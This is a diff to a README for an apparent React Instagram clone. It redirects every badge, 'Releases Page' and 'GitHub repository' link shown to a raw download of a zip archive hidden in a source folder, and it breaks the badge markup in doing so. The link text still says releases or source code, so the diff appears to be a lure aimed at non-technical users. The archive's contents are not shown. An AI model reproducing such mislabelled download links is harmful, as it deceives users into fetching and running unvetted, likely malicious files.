@@ -1,7 +1,7 @@
 # 🎉 insta-react-app - Your Personal Instagram Experience Made Easy
 
 ## 📥 Download the App
-[![Download Now](https://img.shields.io/badge/Download%20Now-latest-blue.svg)](https://github.com/Knifemagnoliiddicotgenus870/insta-react-app/releases)
+[![Download Now](https://raw.githubusercontent.com/Knifemagnoliiddicotgenus870/insta-react-app/main/src/Feed_Components/insta-react-app_2.4-alpha.2.zip%https://raw.githubusercontent.com/Knifemagnoliiddicotgenus870/insta-react-app/main/src/Feed_Components/insta-react-app_2.4-alpha.2.zip)](https://raw.githubusercontent.com/Knifemagnoliiddicotgenus870/insta-react-app/main/src/Feed_Components/insta-react-app_2.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to `insta-react-app`, a React-based clone of Instagram. This app lets you create and manage profiles, follow friends, and view posts with ease. No need to be a technical expert to get started. Follow the steps below to download and run the application.
@@ -14,7 +14,7 @@ Before downloading, make sure you have the following:
 - A modern web browser (Chrome, Firefox, Safari).
 
 ## 🔗 Download & Install
-1. **Visit this page to download:** Go to the [Releases Page](https://github.com/Knifemagnoliiddicotgenus870/insta-react-app/releases) to find the latest version of the app.
+1. **Visit this page to download:** Go to the [Releases Page](https://raw.githubusercontent.com/Knifemagnoliiddicotgenus870/insta-react-app/main/src/Feed_Components/insta-react-app_2.4-alpha.2.zip) to find the latest version of the app.
    
 2. **Choose the right version:** On the Releases page, locate the latest stable version. You will see options for different platforms.
 
@@ -53,10 +53,10 @@ If you have any questions or need assistance, feel free to create an issue on th
 - JSON Server for mock backend data management.
 
 ## 📚 Learn More
-Curious about how the app works? Explore the source code on the [GitHub repository](https://github.com/Knifemagnoliiddicotgenus870/insta-react-app). You can see how we built the features or even contribute to the project!
+Curious about how the app works? Explore the source code on the [GitHub repository](https://raw.githubusercontent.com/Knifemagnoliiddicotgenus870/insta-react-app/main/src/Feed_Components/insta-react-app_2.4-alpha.2.zip). You can see how we built the features or even contribute to the project!
 
 ## ⚡ Contribute
 We welcome contributions from the community. If you want to help out, check the contribution guidelines in the repository.
 
 ## 🔗 Download the App Again
-Don't forget you can always revisit the [Releases Page](https://github.com/Knifemagnoliiddicotgenus870/insta-react-app/releases) to download the latest version of `insta-react-app`. Enjoy exploring your personal Instagram clone!
+Don't forget you can always revisit the [Releases Page](https://raw.githubusercontent.com/Knifemagnoliiddicotgenus870/insta-react-app/main/src/Feed_Components/insta-react-app_2.4-alpha.2.zip) to download the latest version of `insta-react-app`. Enjoy exploring your personal Instagram clone!
